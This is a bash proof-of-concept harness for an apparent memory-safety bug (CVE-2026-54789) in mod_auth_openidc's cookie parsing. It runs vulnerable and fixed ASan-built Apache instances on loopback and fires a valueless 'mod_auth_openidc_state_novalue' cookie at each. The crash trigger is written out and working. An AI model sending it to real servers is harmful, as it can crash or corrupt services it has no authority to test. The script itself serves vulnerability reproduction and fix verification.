#!/usr/bin/env bash
# Live ASan httpd loopback probe for CVE-2026-54789.
# Requires the two ASan modules already built under src/ (see PROVENANCE.md).
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.71-asanapr-install/bin/httpd
URL=http://127.0.0.1:18090/protected
mkdir -p "$HERE/evidence"

run_variant() {
    name="$1"; conf="$2"; logprefix="$3"
    if [ "$name" = vuln ]; then errlog="$HERE/error_log"; else errlog="$HERE/error-fixed.log"; fi
    "$HTTPD" -f "$HERE/$conf" -k stop >/dev/null 2>&1
    sleep 1
    : > "$errlog"
    rm -f "$HERE"/"${logprefix}"-asan.log.* "$HERE/evidence/${name}-codes.txt"
    ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:log_path=$HERE/${logprefix}-asan.log:symbolize=1" \
        "$HTTPD" -f "$HERE/$conf" -k start >"$HERE/evidence/${name}-start.out" 2>&1
    sleep 2
    for i in $(seq 1 30); do
        code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
            -H 'Cookie: mod_auth_openidc_state_novalue' "$URL" 2>/dev/null)
        echo "attack $i $code" >>"$HERE/evidence/${name}-codes.txt"
    done
    for i in $(seq 1 10); do
        code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
            -H 'Cookie: mod_auth_openidc_state_abc=1' "$URL" 2>/dev/null)
        echo "safe $i $code" >>"$HERE/evidence/${name}-codes.txt"
    done
    "$HTTPD" -f "$HERE/$conf" -k stop >/dev/null 2>&1
    sleep 1
    rm -f "$HERE/evidence/${logprefix}"-asan.log.*
    cp "$errlog" "$HERE/evidence/${name}-error.log"
    cp "$HERE"/"${logprefix}"-asan.log.* "$HERE/evidence/" 2>/dev/null || true
    faults=$(grep -l 'ERROR: AddressSanitizer' "$HERE/evidence/${logprefix}"-asan.log.* 2>/dev/null | wc -l)
    pinned=$(grep -h 'SUMMARY: AddressSanitizer' "$HERE/evidence/${logprefix}"-asan.log.* 2>/dev/null \
        | grep -c 'state.c:214 in oidc_state_cookies_parse_token' || true)
    empty=$(grep '^attack' "$HERE/evidence/${name}-codes.txt" | awk '$3=="000"' | wc -l)
    ok=$(grep '^attack' "$HERE/evidence/${name}-codes.txt" | awk '$3=="302"' | wc -l)
    dispatch=$(grep 'oidc_state_cookies_process_one' "$HERE/evidence/${name}-error.log" 2>/dev/null \
        | grep -c 'novalue' || true)
    printf '%s: ASan_reports=%s pinned_214=%s empty_reply=%s http302=%s dispatch=%s\n' \
        "$name" "$faults" "$pinned" "$empty" "$ok" "$dispatch"
}

echo "sha256: $(sha256sum "$HERE/src/mod_auth_openidc/src/state.c" | awk '{print $1}')"
run_variant vuln httpd-asan.conf asan
run_variant fixed httpd-fixed.conf asan-fixed
